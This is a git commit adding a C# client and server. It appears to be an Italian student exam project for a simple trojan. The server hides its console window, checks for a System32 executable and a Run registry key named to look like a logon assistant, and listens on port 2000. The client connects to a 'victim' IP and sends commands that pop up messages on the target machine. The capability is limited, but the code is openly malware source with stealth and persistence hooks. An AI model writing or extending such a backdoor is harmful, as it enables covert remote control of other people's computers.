5f457acf8d138f6b6fa347670f2f28c6211f3bbf
FarinaChristian <58805490+FarinaChristian@users.noreply.github.com>
2024-01-17 04:35:13 -0500

    Add files via upload

---
+++ client.cs
@@ -0,0 +1,101 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Net.Sockets;
+using System.Threading.Tasks;
+
+namespace esame
+{
+    class Program
+    {
+        public static bool IsConnected;
+        public static NetworkStream Writer;
+
+        public static void SendCommand(string Command)//questo metodo prova a mandare i comandi
+        {
+            try
+            {
+                //array dove metto il comando
+                byte[] Packet = Encoding.ASCII.GetBytes(Command);
+
+                //mando il comando
+                Writer.Write(Packet, 0, Packet.Length);
+
+                //Flush out any extra data that didn't send in the start.
+                Writer.Flush();
+            }
+
+            catch
+            {
+                IsConnected = false;
+
+                Console.WriteLine("Disconnessione dal server");
+                Console.ReadKey();
+
+                //chiudo la connessione.
+                Writer.Close();
+            }
+        }
+        static void Main(string[] args)
+        {
+
+            //è TcpClient; si usa per la connessione
+            TcpClient Connector = new TcpClient();
+
+        //etichetta su cui in fondo si fa il salto
+        GetConnection:
+
+            //passo come parametro l'ip della vittima datomi dal server in python
+            Console.WriteLine("Scrivi l'indirizzo IP :");
+            string IP = Console.ReadLine();
+
+            //provo a connettermi
+            try
+            {
+                //mi connetto all'IP e alla porta 2000
+                Connector.Connect(IP, 2000);
+
+                IsConnected = true;
+
+                //serve per scrivere
+                Writer = Connector.GetStream();
+
+                //se arrivo qui mi sono connesso
+            }
+
+            catch
+            {
+                //connession fallita
+                Console.WriteLine("Errore di connessione, premi un tasto per continuare");
+                Console.ReadKey();
+
+                //riprovo
+                Console.Clear();
+                goto GetConnection;
+            }
+
+            Console.WriteLine("Connessione stabilita a " + IP + ".");
+            Console.WriteLine("Digita H per vedere la lista di comandi");
+
+            //sono connesso al server
+            while (IsConnected)
+            {
+                Console.WriteLine("Enter command : ");
+                string CMD = Console.ReadLine();
+
+                //comando help
+                if (CMD == "H")
+                {
+                    Console.WriteLine("COMANDI");
+                    Console.WriteLine("MESSAGE>>>tuoMessaggio");
+                }
+                else//altrimenti mando il comando scritto
+                {
+                    SendCommand(CMD);
+                }
+
+            }
+        }
+    }
+}
---
+++ server.cs
@@ -0,0 +1,110 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Net.Sockets;
+using System.IO;
+using Microsoft.Win32;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Text;
+
+namespace esameServer
+{
+    class Program
+    {
+        public static NetworkStream Receiver;
+        [DllImport("kernel32.dll")]
+        public static extern bool FreeConsole();
+
+        public static void Receive()//metodo che prova a leggere i dati mandati
+        {
+            while (true)
+            {
+                try
+                {
+                    //array che contiene i dati ricevuti
+                    byte[] RecPacket = new byte[1000];
+
+                    //leggo il comando inviato
+                    Receiver.Read(RecPacket, 0, RecPacket.Length);
+
+                    Receiver.Flush();
+
+                    //converto da byte a stringa
+                    string Command = Encoding.ASCII.GetString(RecPacket);
+
+                    //divido il comando col separatore scelto >>>
+                    string[] CommandArray = System.Text.RegularExpressions.Regex.Split(Command, ">>>");
+
+                    //Get the actual command.
+                    Command = CommandArray[0];
+
+                    //è lo switch dei comandi, ne posso aggiungere anche altri
+                    switch (Command)
+                    {
+                        case "MESSAGE":
+                            //ottengo il messaggio
+                            string Msg = CommandArray[1];
+                            //mostro il messaggio nel pc della vittima
+                            System.Windows.Forms.MessageBox.Show(Msg.Trim('\0'));
+                            break;
+                    }
+                }
+                catch
+                {
+                    //smetto di leggere i dati ed esco dal ciclo
+                    break;
+                }
+
+            }
+        }
+
+        public static bool CheckIfRan()
+        {
+            bool IsRan = false;
+            //controllo se il trojan c'è in System32
+            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe"))
+            {
+                //controllo, se è nel registro
+                RegistryKey k = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
+                //se "logonassist" esiste in startup
+                if (k.GetValue("logonassist") != null)
+                {
+                    IsRan = true;
+                }
+                else
+                {
+                    IsRan = false;
+                }
+            }
+            return IsRan;
+        }
+
+        static void Main(string[] args)
+        {
+            //nascondi il prompt
+            FreeConsole();
+
+            //controllo se il programma è già partito
+            bool Check = CheckIfRan();
+
+            //se non è già partito lo faccio partire
+            if (!Check)
+            {
+                //in ascolto per la connessione 
+                TcpListener l = new TcpListener(2000);
+                l.Start();
+
+                //accetto la connessione
+                TcpClient Connection = l.AcceptTcpClient();
+
+                //ricevo lo stream
+                Receiver = Connection.GetStream();
+
+                //lancio il thread del metodo Receive
+                System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(Receive));
+                Rec.Start();
+            }
+
+        }
+    }
+}
